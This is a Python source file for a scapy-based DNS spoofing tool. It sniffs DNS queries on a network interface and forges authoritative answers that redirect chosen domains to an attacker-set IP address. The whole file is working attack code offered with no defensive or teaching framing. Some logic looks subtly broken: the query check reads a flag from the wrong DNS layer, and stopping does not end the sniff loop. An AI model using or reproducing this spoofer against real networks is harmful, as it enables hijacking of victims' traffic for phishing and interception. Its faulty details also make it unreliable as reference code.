#!/usr/bin/env python3
import threading
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff

class DNSSpoofer:
    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self.redirect_rules = {}
        self.sniff_thread = None
        
    def add_rule(self, domain, redirect_ip):
        self.redirect_rules[domain] = redirect_ip
        
    def remove_rule(self, domain):
        if domain in self.redirect_rules:
            del self.redirect_rules[domain]
            
    def clear_rules(self):
        self.redirect_rules.clear()
        
    def dns_response(self, packet):
        if packet.haslayer(DNSQR) and packet.getlayer(DNSQR).qr == 0:
            queried_domain = packet[DNSQR].qname.decode('utf-8').rstrip('.')
            for domain, redirect_ip in self.redirect_rules.items():
                if domain in queried_domain:
                    ip_layer = IP(dst=packet[IP].src, src=packet[IP].dst)
                    udp_layer = UDP(dport=packet[UDP].sport, sport=53)
                    dns_layer = DNS(
                        id=packet[DNS].id, qr=1, aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNS].qd.qname, ttl=300, rdata=redirect_ip)
                    )
                    response_packet = ip_layer / udp_layer / dns_layer
                    send(response_packet, iface=self.interface, verbose=False)
                    return True
        return False
        
    def packet_handler(self, packet):
        if self.running:
            self.dns_response(packet)
            
    def start(self):
        self.running = True
        self.sniff_thread = threading.Thread(
            target=lambda: sniff(
                iface=self.interface,
                filter="udp port 53",
                prn=self.packet_handler,
                store=False
            )
        )
        self.sniff_thread.daemon = True
        self.sniff_thread.start()
        
    def stop(self):
        self.running = False
        if self.sniff_thread:
            self.sniff_thread.join(timeout=2)
